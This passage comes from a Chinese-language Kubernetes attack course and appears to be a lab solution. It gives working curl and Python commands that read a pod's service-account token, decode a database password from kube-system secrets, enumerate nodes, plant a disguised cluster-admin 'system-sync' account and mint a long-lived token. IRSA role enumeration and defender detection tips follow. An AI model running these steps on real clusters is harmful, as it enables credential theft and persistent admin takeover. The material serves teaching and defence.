# ===== Pod 內：步驟二 — 讀取 Token，確認身份 =====

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# 解碼 JWT payload
echo $TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
# {"iss":"kubernetes/serviceaccount",
#  "kubernetes.io/serviceaccount/namespace":"vuln-app",
#  "kubernetes.io/serviceaccount/service-account.name":"webapp-sa",
#  "sub":"system:serviceaccounts:vuln-app:webapp-sa",
#  "exp":1790000000}

# 查詢 kube-system Secret 列舉權限
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"resource":"secrets","verb":"list","namespace":"kube-system"}}}'
# {..."status":{"allowed":true,"reason":"RBAC: allowed by ClusterRoleBinding \"webapp-sa-admin\"..."}}

# ===== Pod 內：步驟三 — 外洩機密 =====

# 解碼 db-credentials
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets/db-credentials \
  | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
pw = d['data'].get('password', '')
print(base64.b64decode(pw).decode())
"
# super-secret-db-password

# ===== Pod 內：步驟四 — 列舉節點 =====

curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/nodes \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for node in d.get('items', []):
    name = node['metadata']['name']
    addrs = node.get('status', {}).get('addresses', [])
    ip = next((a['address'] for a in addrs if a['type'] == 'InternalIP'), 'N/A')
    print(f'Node: {name}  IP: {ip}')
"
# Node: minikube  IP: 192.168.49.2

# ===== Pod 內：步驟五 — 建立 Shadow SA =====

curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $APISERVER/api/v1/namespaces/kube-system/serviceaccounts \
  -d '{"apiVersion":"v1","kind":"ServiceAccount","metadata":{"name":"system-sync","namespace":"kube-system"}}'
# {"kind":"ServiceAccount","metadata":{"name":"system-sync","namespace":"kube-system",...}}

curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -d '{"apiVersion":"rbac.authorization.k8s.io/v1","kind":"ClusterRoleBinding","metadata":{"name":"system:sync:admin"},"subjects":[{"kind":"ServiceAccount","name":"system-sync","namespace":"kube-system"}],"roleRef":{"kind":"ClusterRole","name":"cluster-admin","apiGroup":"rbac.authorization.k8s.io"}}'
# {"kind":"ClusterRoleBinding","metadata":{"name":"system:sync:admin",...}}

# ===== Pod 內：步驟六 — 建立長效 Token =====

curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $APISERVER/api/v1/namespaces/kube-system/secrets \
  -d '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"system-sync-token","namespace":"kube-system","annotations":{"kubernetes.io/service-account.name":"system-sync"}},"type":"kubernetes.io/service-account-token"}'

sleep 10

curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets/system-sync-token \
  | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
token = d.get('data', {}).get('token', '')
print(base64.b64decode(token).decode()) if token else print('Not ready')
"
# eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9...（長效 token）
```

### 各步驟機制解釋

**步驟二：為什麼 JWT 不需要密碼就能解碼 payload？**

JWT 的設計是「簽章驗證完整性，payload 本身不加密」。三段的 base64url 解碼後，header 是演算法資訊，payload 是 claims（聲明），signature 是用 API Server 的私鑰簽的。驗證 signature 需要公鑰，但解碼 payload 完全不需要任何密鑰——JWT 的內容本來就預期可以被讀取，只是不能被偽造。

攻擊者解碼 payload 是為了確認 SA 身份（`sub` claim）和 token 有效期（`exp` claim）。

**步驟三：Secret base64 encoding 不是加密的含義**

K8s Secret 的 `data` 欄位要求 base64 編碼，官方理由是「允許儲存任意二進位資料（binary data），不只是 UTF-8 字串」。base64 是可逆的無損轉換，任何人只要有 `get`/`list` Secret 的 RBAC 權限，就能讀到明文。

真正的靜態保護是 etcd encryption at rest（在 `kube-apiserver` 的 `--encryption-provider-config` 設定 AES-CBC 或 AES-GCM）。啟用後，Secret 在寫入 etcd 時會被加密，但 API Server 仍然能解密提供給有權限的 client。所以：etcd 被直接讀（如 backup 洩漏）拿不到明文；但有 RBAC `get secret` 權限的攻擊者依然能讀明文。

**步驟五：Shadow SA 持久化的機制**

`ClusterRoleBinding` 不從屬於任何 Pod 或 Deployment，它是獨立的叢集層級資源。K8s 的 GC（Garbage Collection）只回收有 `ownerReferences` 指向已刪除父資源的物件。我們建立的 `system:sync:admin` ClusterRoleBinding 沒有設定任何 `ownerReferences`，所以 K8s GC 永遠不會自動刪它。

防守方偵測這種持久化的手段：
1. 審計 `kube-system` 的非原生 SA（`kubectl get sa -n kube-system` 和比對 K8s 文件中的系統元件清單）
2. 定期 diff ClusterRoleBinding 清單（和 baseline 比較，找出新增的 `cluster-admin` 綁定）
3. 用 Falco 或 K8s Audit Log 監控 `clusterrolebindings` 的 `CREATE` 事件

**步驟六：長效 Token 和 projected token 的差異**

| 屬性 | `kubernetes.io/service-account-token` Secret | Projected ServiceAccount Token |
|------|----------------------------------------------|-------------------------------|
| 過期時間 | 無（除非 SA 被刪或 Secret 被刪） | 預設 1 小時，可調至最長 48 小時 |
| 撤銷方式 | 刪除 Secret | SA 被刪、Pod 重啟，或輪替週期到 |
| 儲存位置 | etcd（以 Secret 形式） | kubelet 動態產生，不持久化 |
| K8s 版本 | 1.22 之前預設自動建立；1.22+ 需手動建立 | K8s 1.20+ 預設啟用 |

長效 Token 對攻擊者的價值：取得後可以在叢集外部（甚至網路隔離的地方）長期保有 cluster-admin 存取，不受 Pod 生命週期影響。

### 常見錯誤訊息診斷速查

| 錯誤 | HTTP Code | 原因 | 解法 |
|------|-----------|------|------|
| `Unauthorized` | 401 | Token 無效或過期 | 重新 exec 進 Pod，重新讀 token |
| `Forbidden` | 403 | Token 有效，但無此操作的 RBAC 授權 | 確認 ClusterRoleBinding 正確建立 |
| `Not Found` | 404 | API 路徑打錯，或資源不存在 | 確認 API group 路徑（`/api/v1` vs `/apis/rbac.../v1`） |
| `Conflict` | 409 | 資源已存在（重複 POST） | 改用 PUT，或先 DELETE 再 POST |
| `Unprocessable Entity` | 422 | JSON body 格式錯誤 | 用 `python3 -m json.tool` 驗證 JSON 語法 |

</details>

<details>
<summary>點開參考解答 — IRSA 攻擊流程詳解（理論）</summary>

### IRSA Token 換 AWS 憑證的完整流程

```
Pod 掛載的 projected token (/var/run/secrets/eks.amazonaws.com/serviceaccount/token)
  │  (audience: sts.amazonaws.com, 簽章由 EKS OIDC Provider 持有的私鑰產生)
  │
  ▼
STS AssumeRoleWithWebIdentity
  │  參數：WebIdentityToken=<token>, RoleArn=<role_arn>, RoleSessionName=<任意字串>
  │  驗證：STS 向 EKS OIDC Provider 取得公鑰，驗證 token 簽章
  │  條件：IAM Role 的 Trust Policy 允許這個 OIDC Provider + SA 組合
  │
  ▼
AWS 臨時憑證（AccessKeyId + SecretAccessKey + SessionToken）
  有效期 1 小時（預設）至 12 小時（最長）
  │
  ▼
用這組憑證呼叫 AWS API（S3/EC2/RDS/IAM…）
  權限由 IAM Role 的 Permission Policy 決定
```

### Trust Policy 長什麼樣子

IAM Role 的 Trust Policy 控制誰能 assume 這個 Role：

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/oidc.eks.ap-northeast-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71EXAMPLE"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "oidc.eks.ap-northeast-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71EXAMPLE:sub": "system:serviceaccount:production:my-app-sa",
          "oidc.eks.ap-northeast-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71EXAMPLE:aud": "sts.amazonaws.com"
        }
      }
    }
  ]
}
```

`Condition.StringEquals.sub` 限制了只有特定 namespace 的特定 SA 才能 assume 這個 Role。如果攻擊者的 SA 是 `vuln-app:webapp-sa`，而 Trust Policy 綁定的是 `production:my-app-sa`，STS 會拒絕請求：

```xml
<Error>
  <Code>AccessDenied</Code>
  <Message>Not authorized to perform sts:AssumeRoleWithWebIdentity</Message>
</Error>
```

### 攻擊者如何找到有價值的 IRSA SA

```bash
# 列出所有有 IRSA annotation 的 SA
kubectl get serviceaccounts --all-namespaces -o json \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for item in d.get('items', []):
    ann = item.get('metadata', {}).get('annotations', {})
    role = ann.get('eks.amazonaws.com/role-arn', '')
    if role:
        ns = item['metadata']['namespace']
        name = item['metadata']['name']
        print(f'{ns}/{name} -> {role}')
"
```

**預期輸出（範例）**：

```
production/payments-sa -> arn:aws:iam::123456789012:role/PaymentsFullAccessRole
monitoring/prometheus-sa -> arn:aws:iam::123456789012:role/PrometheusReadOnlyRole
```

有 cluster-admin 的攻擊者能看到所有 SA 的 annotation，也就能列舉叢集中所有可被竊取的 AWS Role。

</details>

---

**對應章節**：
- Ch25 — K8s 偵察：枚舉 SA、RBAC、資源
- Ch26 — RBAC 提權：從命名空間到叢集層級
- Ch27 — Pod 逃逸路線（hostPath、hostPID、privileged）
- Ch28 — Node 橫向移動：從 Node 取得 kubelet token
- Ch29 — K8s 持久化：Shadow SA、後門 CRD、DaemonSet 植入

**下一章**：[Ch31 — CI/CD 攻擊面：GitHub Actions + ArgoCD 配置錯誤](./31-cicd-attacks.md)
